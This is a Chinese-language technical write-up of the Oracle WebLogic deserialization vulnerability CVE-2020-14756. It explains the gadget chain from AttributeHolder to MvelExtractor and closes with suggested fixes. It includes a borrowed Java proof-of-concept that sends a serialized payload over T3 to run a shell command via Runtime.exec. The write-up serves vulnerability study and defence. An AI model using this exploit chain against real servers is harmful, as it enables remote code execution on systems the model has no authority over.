## CVE-2020-14756

## 原理

这个CVE的利用方式，主要是通过找到了一个类，`com.tangosol.coherence.servlet.AttributeHolder`，其实现了一个接口为`Externalizable`，且同时实现了接口`Serializable`,
能够进行反序列化操作。

![image-20221226115916007.png](https://image.3001.net/images/20221226/1672062943_63a9a7dfb0d8901d3fbe3.png!small)

其中实现了`readExternal / writeExternal`两个方法，

![image-20221226120254463.png](https://image.3001.net/images/20221226/1672062951_63a9a7e73f7822795a25f.png!small)

实现了自己的序列化和反序列化逻辑，在进行序列化的时候，将会调用`ExternalizableHelper.writeObject`方法，将该类的`m_oValue`对象值进行序列化，

而在其对应的反序列化操作调用`readExternal`方法的时间，将会调用`ExternaliableHelper.readObject`方法进行反序列化，

通过这种自定义序列化和反序列化的方式，绕过了在`readObject`调用过程中的黑名单校验。

## 分析

接着前面提到的该CVE的source点是`com.tangosol.coherence.servlet.AttributeHolder`类，我们详细看看为什么要使用该类作为source点，

该类的反序列化过程中因为该类是不存在于weblogic的黑名单中的，是可以进行反序列化操作的，在其反序列化的过程中。

调用栈：

    
    
    readOrdinaryObject:2069, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    

在调用`readOrdinaryObject`方法的过程中，存在有一个判断，

![image-20221226151125029.png](https://image.3001.net/images/20221226/1672063000_63a9a81844bdc708ff4df.png!small)

这里，如果需要反序列化的类是实现了`Externaliable`接口的话，将会调用`readExternalData`方法进行反序列化操作。

![image-20221226151344468.png](https://image.3001.net/images/20221226/1672063006_63a9a81ed95d74fe442a2.png!small)

自然而然的将会调用对应类的`readExternal`方法进行反序列化。

该CVE最终的sink是在`com.tangosol.coherence.rest.util.extractor.MvelExtractor`类中。

该类是一个实现了`ExternalizableLite`接口的类，那么这个接口有什么用吗？

> 如果在反序列化的过程中，该类实现了这个接口，并且实现了对应的`readExternal`方法，将会调用该方法进行反序列化。

前面明白了实现`Externalizable`接口为什么可以调用`readExternal`方法进行反序列化操作，接下来我们同样看看实现了`ExternalizableLite`接口为什么也能够调用`readExternal`方法进行反序列化操作。

这里就拿前面提到的source点举个例子。

在其`readExternal`的调用中，

![image-20221226152434872.png](https://image.3001.net/images/20221226/1672063016_63a9a828385d3483168d6.png!small)

存在有`ExternalizableHelper#readObject`方法的调用，

![image-20221226152555196.png](https://image.3001.net/images/20221226/1672063025_63a9a83133b3f7ed0593b.png!small)

进而存在有`readObjectInternal`方法的调用，

![image-20221226152653849.png](https://image.3001.net/images/20221226/1672063031_63a9a837a2874242d0ad4.png!small)

这里是通过switch-case语句判断`nType`的值来决定不同的操作。

nType的来源是哪里呢？

> 主要的代码逻辑是在`ExternalizableHelper#writeObject`方法中。

![image-20221226152934492.png](https://image.3001.net/images/20221226/1672063039_63a9a83f50521f50bd51d.png!small)

这里是通过调用`getStreamFormat`方法获取`nType`的值，之后调用`writeByte`将其序列化，并且通过得到的值进行对应的序列化操作，

来看看`getStreamFormat`方法的逻辑

    
    
    public static int getStreamFormat(Object o) {
        return o == null ? 0 : (o instanceof String ? 6 : (o instanceof Number ? (o instanceof Integer ? 1 : (o instanceof Long ? 2 : (o instanceof Double ? 3 : (o instanceof BigInteger ? 4 : (o instanceof BigDecimal ? 5 : (o instanceof Float ? 14 : (o instanceof Short ? 15 : (o instanceof Byte ? 16 : 11)))))))) : (o instanceof byte[] ? 8 : (o instanceof ReadBuffer ? 7 : (o instanceof XmlBean ? 12 : (o instanceof ExternalizableHelper.IntDecoratedObject ? 13 : (o instanceof ExternalizableLite ? 10 : (o instanceof Boolean ? 17 : (o instanceof Serializable ? 11 : (o instanceof Optional ? 22 : (o instanceof OptionalInt ? 23 : (o instanceof OptionalLong ? 24 : (o instanceof OptionalDouble ? 25 : (o instanceof XmlSerializable ? 9 : 255))))))))))))));
    }
    

其中如果序列化的类实现了`ExternalizableLite`接口的，将会为nType赋值为10。

以上就是nType值得出处，

回到反序列化的switch-case语句的逻辑中，

如果nType的值是10的话，将会调用`readExternalizableLite`继续进行操作。

![image-20221226153554914.png](https://image.3001.net/images/20221226/1672063049_63a9a8490ed4fc8b981bc.png!small)

![image-20221226153630673.png](https://image.3001.net/images/20221226/1672063055_63a9a84ff32dcba46f50e.png!small)

而在对应方法中，将会调用`loadClass`方法进行目标类的加载，之后在后面进行了`readExternal`方法的调用。

以上，就是为什么实现了`ExternalizableLite`接口的类，在反序列化的过程中将会调用对应类的`readExternal`方法。

之后我们回到前面提及到的sink点，也即是`MvelExtractor`类，

在这个类的`extract`方法中，能够进行MVEL表达式的执行，

![image-20221226154712376.png](https://image.3001.net/images/20221226/1672063064_63a9a85864edcd9ea8bef.png!small)

其中因为属性`m_sExpr`是可控的，所以只需要能够执行其extract方法，也就能达到我们的目的。

根据以前的CVE分析知识，我们能够知道在`AbstractExtractor#compare`方法中是能够调用自身类的`extract`方法的，

![image-20221226155516872.png](https://image.3001.net/images/20221226/1672063071_63a9a85f7ecbf9909f4ae.png!small)

而sink点也是继承了这个类的，所以我们只需要能够触发他的compare方法也即能达到目的，

这里作者是寻找到了`com.tangosol.util.aggregator.TopNAggregator.PartialResult`这个类。

![image-20221226155614753.png](https://image.3001.net/images/20221226/1672063078_63a9a866dfdf627e7db10.png!small)

这个类是实现了`ExternalizableLite`接口的，所以在反序列化的过程中会调用他的`readExternal`方法。

![image-20221226155747866.png](https://image.3001.net/images/20221226/1672063085_63a9a86dcdeaeb14d35f2.png!small)

这里将反序列化得到的`m_comparator`属性值传递给`instantiateInternalMap`方法。

![image-20221226160201188.png](https://image.3001.net/images/20221226/1672063092_63a9a874b237d90f62de4.png!small)

创建了一个`TreeMap`对象并返回，

之后在for循环中调用add方法将会触发对应的put方法，最终将会导致compare方法的调用，达到我们的目的。

之后我们的目标就变成了调用`com.tangosol.util.aggregator.TopNAggregator.PartialResult`类的`readExternal`方法，

单纯的反序列化这个类并不能够触发该方法的调用，我们还需要寻找一个桥接。

因为该类是没有实现`Externalizable`接口的，并不能在readObject的调用过程中触发`readExternal`方法。

这里主要是依靠前面提到的source点，也即是`AttributeHolder`类来进行了中转

> 因为该类不仅是实现了`Externalizable`接口，
>
> 同时在readExternal方法的调用过程中调用了`ExternalizableHelper.readObject`进行反序列化。

经过上面的分析，一条完整的链子就形成了。

借用Y4er的POC

    
    
    public class CVE_2020_14756 {
        public static void main(String[] args) {
            MvelExtractor extractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"touch /tmp/14756\");");
            MvelExtractor extractor2 = new MvelExtractor("");
            try {
                SortedBag sortedBag = new TopNAggregator.PartialResult(extractor2, 2);
                AttributeHolder attributeHolder = new AttributeHolder();
                sortedBag.add(1);
                Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
                m_comparator.setAccessible(true);
                m_comparator.set(sortedBag, extractor);
                Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
                setInternalValue.setAccessible(true);
                setInternalValue.invoke(attributeHolder, sortedBag);
                T3ProtocolOperation.send("192.168.153.136", "7001", Serializables.serialize(attributeHolder));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    

在我使用12.1.3搭建的环境进行复现过程中，使用上面的POC进行利用，并不能够利用成功。

## 来看看报错

![image-20221226161438614.png](https://image.3001.net/images/20221226/1672063105_63a9a8816cc9a615c5b5a.png!small)

不能够加载`MvelExtractor`这个类，但是可以通过寻找其他的替带类类解决这个问题。

## 调用栈

    
    
    findClass:361, URLClassLoader (java.net)
    loadClass:424, ClassLoader (java.lang)
    loadClass:411, ClassLoader (java.lang)
    loadClass:331, Launcher$AppClassLoader (sun.misc)
    loadClass:357, ClassLoader (java.lang)
    forName0:-1, Class (java.lang)
    forName:348, Class (java.lang)
    loadClass:3367, ExternalizableHelper (com.tangosol.util)
    readExternalizableLite:2111, ExternalizableHelper (com.tangosol.util)
    readObjectInternal:2443, ExternalizableHelper (com.tangosol.util)
    readObject:2389, ExternalizableHelper (com.tangosol.util)
    readObject:2368, ExternalizableHelper (com.tangosol.util)
    readExternal:274, TopNAggregator$PartialResult (com.tangosol.util.aggregator)
    readExternalizableLite:2139, ExternalizableHelper (com.tangosol.util)
    readObjectInternal:2443, ExternalizableHelper (com.tangosol.util)
    readObject:2389, ExternalizableHelper (com.tangosol.util)
    readObject:2368, ExternalizableHelper (com.tangosol.util)
    readExternal:406, AttributeHolder (com.tangosol.coherence.servlet)
    readExternal:371, AttributeHolder (com.tangosol.coherence.servlet)
    readExternalData:2062, ObjectInputStream (java.io)
    readOrdinaryObject:2011, ObjectInputStream (java.io)
    readObject0:1535, ObjectInputStream (java.io)
    readObject:422, ObjectInputStream (java.io)
    readObject:67, InboundMsgAbbrev (weblogic.rjvm)
    

## 修复

  1. 限制T3 / IIOP协议的使用，

  2. loadClass方法调用进行类加载之后添加黑名单校验功能。

